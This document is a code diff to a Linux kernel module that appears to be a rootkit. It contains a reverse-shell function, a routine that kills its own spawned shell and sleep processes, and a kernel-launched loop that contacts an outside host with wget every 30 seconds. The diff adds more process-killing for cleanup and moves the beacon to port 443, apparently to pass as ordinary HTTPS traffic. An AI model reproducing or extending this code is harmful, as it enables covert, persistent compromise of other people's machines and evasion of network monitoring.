@@ -49,6 +49,13 @@ static void find_and_kill_our_processes(void) {
 			send_sig(SIGKILL, task, 0);
 		    killed = true;	
 		}
+		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
+			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
+			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
+			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
+			send_sig(SIGKILL, task, 0);
+			killed = true;
+		}
 		// pour les sleep
 		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) { 
 			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
@@ -110,9 +117,9 @@ static void rev_shell(void) {
 //function to make a request every 30s
 static void make_request_periodic(void) {
 	char *str;
-	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":8000/UP; sleep 30; done") + 1;
+	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":443/UP; sleep 30; done") + 1;
 	str = kmalloc(size, GFP_KERNEL);
-	snprintf(str, size, "while true; do wget http://%s:8000/UP; sleep 30; done", host);
+	snprintf(str, size, "while true; do wget http://%s:443/UP; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
